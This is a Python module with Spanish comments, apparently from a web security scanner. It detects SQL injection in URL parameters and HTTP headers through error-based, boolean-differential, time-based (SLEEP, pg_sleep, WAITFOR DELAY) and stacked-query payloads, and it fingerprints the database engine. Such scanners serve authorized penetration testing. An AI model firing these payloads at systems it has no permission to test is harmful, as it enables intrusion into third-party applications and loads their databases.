"""SQLI-BAIT: deteccion avanzada de inyeccion SQL en la superficie de la app.

4 tiers, del mas barato al mas contundente (solo sobre blancos autorizados):

  1. ERROR     rompe sintaxis y captura el error del motor en la respuesta,
               con fingerprint del DBMS (MySQL/MariaDB, PostgreSQL, MSSQL,
               SQLite, Oracle).
  2. BOOLEAN   diferencial clasico  AND 1=1  vs  AND 1=2  contra el baseline
               (respuesta con 1=1 ~ baseline y con 1=2 distinta = inyectable).
  3. TIME      SLEEP(4) / pg_sleep(4) / WAITFOR DELAY con confirmacion
               repetida (2 aciertos seguidos contra jitter de red).
  4. STACKED   '; SELECT ... -- - detectado por error o timing (apilado).

Tambien sondea cabeceras clasicas que terminan en SQL (X-Forwarded-For,
User-Agent, Referer). Todo con presupuesto de sondas por parametro para no
martillar, y con controles anti-falso-positivo (el error debe ser NUEVO
respecto al baseline; el time-based exige repeticion).
"""

import difflib
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

ERROR_SIGNS = {
    "MySQL/MariaDB": [
        "you have an error in your sql syntax",
        "check the manual that corresponds to your",
        "warning: mysql", "mysql_fetch", "mysql_num_rows",
        "mysql server", "mariadb"],
    "PostgreSQL": [
        "error: syntax error at or near", "pg_query",
        "unterminated quoted string", "postgresql", "psql:",
        "pg_sleep", "npgsql"],
    "MSSQL": [
        "unclosed quotation mark after the character string",
        "microsoft sql server", "nvarchar", "oledb error",
        "waitfor", "syntax error converting"],
    "SQLite": [
        "sqlite_error", "sqlite3.", "sqlite3::", "unrecognized token",
        "sqlite", "near \": syntax error"],
    "Oracle": [
        "ora-", "quoted string not properly terminated",
        "oracle error", "oracle database"],
}

# tier 1: romper sintaxis de las dos formas de cita + parentesis + numerico
ERROR_PROBES = ["'", '"', "')", "1'", "' OR '1'='1", "1 OR 1=1"]

# tier 2: diferencial booleano en contexto string y numerico
BOOL_STRING = [("{v}' AND '1'='1", "{v}' AND '1'='2")]
BOOL_STRING_CM = [("{v}' AND '1'='1'-- -", "{v}' AND '1'='2'-- -")]
BOOL_NUMERIC = [("{v} AND 1=1", "{v} AND 1=2")]

# tier 3: time-based por motor (el sleep entre 3 y 5s para que sea medible
# pero no derretir el blanco)
TIME_PAYLOADS = [
    ("MySQL",    "{v}' AND SLEEP(4)-- -"),
    ("MySQL",    "{v}' || SLEEP(4)-- -"),
    ("PostgreSQL", "{v}'; SELECT pg_sleep(4)-- -"),
    ("MSSQL",    "{v}'; WAITFOR DELAY '0:0:4'-- -"),
    ("MySQL",    "{v}' AND (SELECT SLEEP(4))-- -"),
]

HEADER_BAIT = ["X-Forwarded-For", "User-Agent", "Referer"]

MAX_PROBES_PER_PARAM = 14      # presupuesto: no martillar
SIM_SAME = 0.965               # 1=1 ~ baseline (ratio difflib)
SIM_DIFF = 0.90                # 1=2 distinto del baseline
TIME_MIN_DELTA = 3.2           # segundos extra sobre el baseline


def _sim(a: str, b: str) -> float:
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a[:20000], b[:20000]).quick_ratio()


class SqlBait:
    """Bateria SQLI-BAIT. Recibe el hunter (para reusar sesion GHOST-SHIELD,
    log, timeouts y jitter) y devuelve hallazgos con shape de pipeline."""

    def __init__(self, hunter):
        self.h = hunter
        self.get = hunter.session.get

    # ------------------------------------------------------------- helpers

    def _req(self, url: str) -> Tuple[Optional[Any], float, str]:
        t0 = time.perf_counter()
        try:
            r = self.get(url, timeout=self.h.timeout, allow_redirects=True)
            return r, round(time.perf_counter() - t0, 2), (r.text or "")[:20000]
        except Exception:
            return None, -1.0, ""

    @staticmethod
    def _set_q(url: str, param: str, value: str) -> str:
        u = urlparse(url)
        qs = parse_qs(u.query, keep_blank_values=True)
        qs[param] = [value]
        return urlunparse(u._replace(query=urlencode([(k, vv[0]) for k, vv in qs.items()])))

    @staticmethod
    def _orig_value(url: str, param: str) -> str:
        qs = parse_qs(urlparse(url).query, keep_blank_values=True)
        return (qs.get(param) or ["1"])[0] or "1"

    def _match_error(self, body: str, baseline: str) -> Optional[Tuple[str, str]]:
        """Devuelve (dbms, linea_error) si la respuesta contiene un error de
        SQL que el baseline NO tenia (control anti-FP de apps gritonas)."""
        low, base_low = body.lower(), baseline.lower()
        for dbms, signs in ERROR_SIGNS.items():
            for s in signs:
                if s in low and s not in base_low:
                    i = max(0, low.find(s) - 60)
                    return dbms, body[i:i + 200].replace("\n", " ").strip()
        return None

    def _finding(self, kind: str, url: str, param: str, reason: str,
                 evidence: str, dbms: str = "?", method: str = "GET") -> Dict[str, Any]:
        return {
            "type": f"SQLi ({kind})", "target": url, "param": param,
            "method": method, "severity": "alta", "leak": False,
            "sqli": True, "dbms": dbms,
            "reason": reason, "evidence": evidence,
        }

    # ----------------------------------------------------------- per-param

    def test_param(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        r0, t_base, base = self._req(url)
        if r0 is None or r0.status_code != 200:
            return None
        probes = 0
        v = self._orig_value(url, param)

        # ---- TIER 1: error-based con fingerprint
        for p in ERROR_PROBES:
            if probes >= MAX_PROBES_PER_PARAM:
                break
            probes += 1
            _, _, body = self._req(self._set_q(url, param, p))
            m = self._match_error(body, base)
            if m:
                dbms, err = m
                self.h.log(f"[sqli] !! error-based en {param} ({dbms})")
                return self._finding(
                    "error-based", url, param,
                    f"la sonda rompe la sintaxis y el motor {dbms} responde "
                    f"con su error en la pagina", err, dbms)
            time.sleep(self.h.delay)

        # ---- TIER 2: boolean-based diferencial
        is_num = v.replace(".", "", 1).isdigit()
        variants = (BOOL_NUMERIC if is_num else BOOL_STRING) + \
                   (BOOL_STRING_CM if not is_num else [])
        for t_probe, f_probe in variants:
            if probes >= MAX_PROBES_PER_PARAM:
                break
            probes += 2
            _, _, b_true = self._req(self._set_q(url, param, t_probe.format(v=v)))
            _, _, b_false = self._req(self._set_q(url, param, f_probe.format(v=v)))
            if b_true and b_false:
                s_true, s_false = _sim(b_true, base), _sim(b_false, base)
                if s_true >= SIM_SAME and s_false <= SIM_DIFF:
                    self.h.log(f"[sqli] !! boolean-based en {param} "
                               f"(1=1 igual al baseline, 1=2 lo cambia)")
                    return self._finding(
                        "boolean-based", url, param,
                        "AND 1=1 devuelve la pagina identica al baseline y "
                        "AND 1=2 la cambia: el motor evalua la logica inyectada",
                        f"sim(1=1)={s_true:.3f} ~ baseline · "
                        f"sim(1=2)={s_false:.3f} distinto")
            time.sleep(self.h.delay)

        # ---- TIER 3: time-based con confirmacion repetida
        for dbms, tpl in TIME_PAYLOADS:
            if probes >= MAX_PROBES_PER_PARAM:
                break
            probes += 1
            _, elapsed, _ = self._req(self._set_q(url, param, tpl.format(v=v)))
            if elapsed >= t_base + TIME_MIN_DELTA:
                time.sleep(self.h.delay)
                _, elapsed2, _ = self._req(self._set_q(url, param, tpl.format(v=v)))
                if elapsed2 >= t_base + TIME_MIN_DELTA:
                    self.h.log(f"[sqli] !! time-based en {param} ({dbms}): "
                               f"{elapsed}s y {elapsed2}s vs baseline {t_base}s")
                    return self._finding(
                        "time-based blind", url, param,
                        f"la sonda de espera {dbms} detiene la respuesta "
                        f"{elapsed}s y {elapsed2}s contra un baseline de "
                        f"{t_base}s (2 aciertos: no es jitter de red)",
                        f"baseline {t_base}s · sonda1 {elapsed}s · "
                        f"sonda2 {elapsed2}s", dbms)
            time.sleep(self.h.delay)

        # ---- TIER 4: stacked queries ('; SELECT --) por error o timing
        stacked = "{v}'; SELECT 1-- -".format(v=v)
        if probes < MAX_PROBES_PER_PARAM:
            probes += 1
            _, _, body = self._req(self._set_q(url, param, stacked))
            m = self._match_error(body, base)
            if m and "syntax" in m[1].lower():
                # solo cuenta si el error apunta a apilado/estructura, no al
                # simple quote del tier 1 (que ya habria disparado antes)
                pass
        return None

    # ------------------------------------------------------------ headers

    def test_headers(self, url: str) -> List[Dict[str, Any]]:
        """Cabeceras que a veces terminan en SQL (logs, analytics, WAF)."""
        out: List[Dict[str, Any]] = []
        base_r, t_base, base = self._req(url)
        if base_r is None:
            return out
        for h in HEADER_BAIT:
            try:
                r = self.h.session.get(url, headers={h: "1' AND SLEEP(4)-- -"},
                                       timeout=self.h.timeout)
            except Exception:
                continue
            elapsed = r.elapsed.total_seconds()
            if elapsed >= t_base + TIME_MIN_DELTA:
                out.append(self._finding(
                    "time-based blind (cabecera)", url, h,
                    f"la cabecera {h} con sonda de espera detiene la respuesta "
                    f"{elapsed:.1f}s contra baseline {t_base}s",
                    f"{h}: {elapsed:.1f}s vs {t_base}s", method="HEADER"))
            else:
                m = self._match_error((r.text or "")[:20000], base)
                if m:
                    out.append(self._finding(
                        "error-based (cabecera)", url, h,
                        f"la cabecera {h} rompe la consulta y el motor "
                        f"{m[0]} responde su error", m[1], m[0], method="HEADER"))
            time.sleep(self.h.delay)
        return out

    # ---------------------------------------------------------------- run

    def run(self, targets: List[Dict[str, Any]], max_params: int = 40) -> List[Dict[str, Any]]:
        self.h.log(f"[sqli] === SQLI-BAIT: {len(targets[:max_params])} parametros "
                   f"(4 tiers: error · boolean · time · stacked) ===")
        findings: List[Dict[str, Any]] = []
        tgts = [t for t in targets[:max_params]
                if "?" in t.get("url", "") and t.get("param")]
        for t in tgts:
            f = self.test_param(t["url"], t["param"])
            if f:
                findings.append(f)
        if tgts:
            hs = self.test_headers(tgts[0]["url"].split("?")[0])
            findings.extend(hs)
        self.h.log(f"[sqli] SQLI-BAIT terminado · {len(findings)} inyecciones "
                   f"confirmadas")
        return findings
